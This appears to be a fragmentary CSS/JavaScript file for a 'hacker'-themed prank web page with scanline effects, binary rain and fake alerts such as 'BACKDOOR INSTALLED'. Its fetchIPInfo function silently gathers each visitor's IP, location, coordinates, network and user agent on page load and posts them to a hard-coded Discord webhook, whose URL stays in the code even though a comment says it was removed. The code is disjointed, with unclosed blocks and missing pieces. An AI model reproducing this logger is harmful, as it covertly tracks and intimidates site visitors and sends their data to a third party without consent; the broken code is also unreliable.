    /* Terminal scanline effect */

        top: 0;
        left: 0;
        right: 0;
        bottom: 0;

        background-size: 100% 2px;
        pointer-events: none;
        z-index: 9999;
        animation: scanline 8s linear infinite;

    @keyframes scanline {

        top: 0;
        left: 0;
        width: 100%;
        height: 100%;

        }
        
        // Add initial digits
        for (let i = 0; i < 100; i++) {
            setTimeout(addDigit, i * 100);
        }
        
        // Continue adding digits
        setInterval(addDigit, 50);
    }
    
    createBinaryRain();

    // Transition from first video to content
    const video = document.querySelector('.background-video');

        setTimeout(() => {

    // Enhanced IP information fetch with fallback
    function fetchIPInfo() {
        const infoDiv = document.getElementById('ip-info');
        
        // First try ipinfo.io
        fetch('https://ipinfo.io/json')
            .then(response => {
                if (!response.ok) throw new Error('Network response was not ok');
                return response.json();
            })
            .then(data => {
                updateIPInfo(data);
            })
            .catch(error => {
                console.log('ipinfo.io failed, trying alternative API');
                // Fallback to alternative API
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        updateIPInfo({ip: data.ip, city: 'Unknown', region: 'Unknown', country: 'Unknown'});
                    })
                    .catch(error => {
                        infoDiv.innerHTML = 'COULD NOT RETRIEVE SYSTEM DATA';
                    });
            });
        
        function updateIPInfo(data) {
            const { ip, country, city, region, loc, org, timezone } = data;
            const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
            const dateTime = new Date().toLocaleString();

            infoDiv.innerHTML = `SYSTEM INTRUSION DETECTED
<strong>TARGET IP:</strong> <span style="color: var(--hacker-red)">${ip}</span>
<strong>PORT:</strong> <span style="color: var(--hacker-blue)">${port}</span>
<strong>LOCATION:</strong> ${city}, ${region}, ${country}
<strong>COORDINATES:</strong> ${loc || 'Unknown'}
<strong>NETWORK:</strong> ${org || 'Unknown'}
<strong>TIME:</strong> ${dateTime}
<strong>STATUS:</strong> <span style="color: var(--hacker-red)">COMPROMISED</span>`;

            // Send data to webhook (removed actual webhook URL for security)
            const webhookUrl = 'https://discord.com/api/webhooks/1371537884372275322/CEyBA-r7wA1LkYAaXAtiB8u3vGiUySdhFgkKwtVyhASFNB15FWNZj2pYatkmb-clIDpB';
            if (webhookUrl && webhookUrl.includes('discord.com')) {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `⚠️ **SYSTEM INTRUSION DETECTED** ⚠️\n\n` +
                                 `**Target IP:** \`${ip}\`\n` +
                                 `**Port:** \`${port}\`\n` +
                                 `**Location:** ${city}, ${region}, ${country}\n` +
                                 `**Coordinates:** ${loc || 'Unknown'}\n` +
                                 `**Network:** ${org || 'Unknown'}\n` +
                                 `**Time:** ${dateTime}\n` +
                                 `**User Agent:** \`${navigator.userAgent}\``
                    })
                }).catch(e => console.log('Webhook failed:', e));
            }
        }
    }
    
    fetchIPInfo();

            "BACKDOOR INSTALLED",
            "SYSTEM INTEGRITY COMPROMISED",
            "ALL DATA HAS BEEN COPIED"
        ];
        
        const alert = document.getElementById('system-alert');
        alert.querySelector('.alert-title').textContent = "SECURITY ALERT [" + Math.floor(Math.random() * 1000) + "]";
        alert.querySelector('.alert-message').textContent = alerts[Math.floor(Math.random() * alerts.length)];
        
        alert.classList.add('active');
        
        setTimeout(() => {

    setInterval(() => {
        if (Math.random() > 0.7) {

    // Easter egg - show secret message on Konami code
    const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
    let konamiIndex = 0;
    
    document.addEventListener('keydown', (e) => {
        if (e.key === konamiCode[konamiIndex]) {

    const marquee = document.querySelector('.marquee');
